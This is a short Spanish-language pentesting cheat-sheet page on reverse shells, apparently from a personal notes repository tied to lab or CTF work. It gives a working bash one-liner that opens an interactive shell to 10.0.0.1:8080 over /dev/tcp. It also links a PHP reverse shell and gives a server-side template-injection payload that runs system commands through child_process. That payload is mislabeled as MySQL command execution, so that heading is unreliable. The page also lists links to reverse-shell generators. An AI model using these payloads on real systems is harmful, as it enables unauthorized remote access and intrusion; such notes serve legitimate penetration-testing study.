---
title: Reverse Shells
---

Una reverse shell es una técnica mediante la cual la máquina comprometida inicia una conexión saliente hacia el atacante, proporcionando una consola interactiva.
Se usa cuando no es posible abrir puertos entrantes o cuando el firewall filtra conexiones directas.

---

## Bash Reverse Shell

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Shell interactiva sobre TCP.
Funciona en sistemas Linux con Bash compilado con soporte /dev/tcp.

Para hacerla interactiva: [TTY-Interactiva](../30-post-exploitation/10-linux/tty-interactiva.md)

---

## PHP Reverse Shell

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Usada cuando existe ejecución de código PHP (file upload, LFI, RCE, etc).
Permite establecer una shell persistente desde entornos web.

---

## MySQL Command Execution

```mysql
{{ process.mainModule.require('child_process').exec('id>/tmp/pwn') }}
```

Permite ejecutar comandos del sistema cuando el backend expone ejecución de plantillas JS.

---

## Recursos

- https://www.revshells.com/
- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://deephacking.tech/reverse-shells-en-windows/
- https://apuntestech.com/2024/11/14/sightless-walkthrough-htb/
